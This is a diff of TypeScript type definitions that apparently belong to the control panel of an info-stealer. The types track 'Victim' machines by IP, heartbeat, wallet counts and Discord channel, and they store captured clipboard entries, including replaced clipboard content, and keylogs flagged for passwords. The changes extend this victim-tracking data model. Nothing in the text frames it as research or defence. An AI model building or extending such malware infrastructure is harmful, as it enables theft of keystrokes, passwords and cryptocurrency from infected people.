@@ -21,13 +21,16 @@ export type Victim = {
   ip: string | null;
   firstSeenAt: string;
   lastHeartbeatAt: string;
+  lastAgentMessageAt?: string;
   revokedAt?: string | null;
   online: boolean;
   wallets?: number;
   artifacts?: number;
   build?: { id: string; name: string; version: string; buildId: string };
+  discord?: { id: string; channelId: string; missingAt: string | null } | null;
   discordChannel?: string | null;
   discordMissingAt?: string | null;
+  discordIgnored?: boolean;
   _count?: Record<string, number>;
   balances?: number;
 };
@@ -71,9 +74,10 @@ export type ClipboardEntry = {
   content: string;
   kind: string;
   replaced: string | null;
+  count?: number;
 };
 
-export type Keylog = { id: string; ts: string; process: string; title: string; text: string; password: boolean };
+export type Keylog = { id: string; ts: string; process: string; title: string; text: string; password: boolean; count?: number };
 
 export type EventRow = { id: string; kind: string; data: Record<string, unknown>; createdAt: string; victim?: { id: string; hostname: string }; readAt: string | null };
 
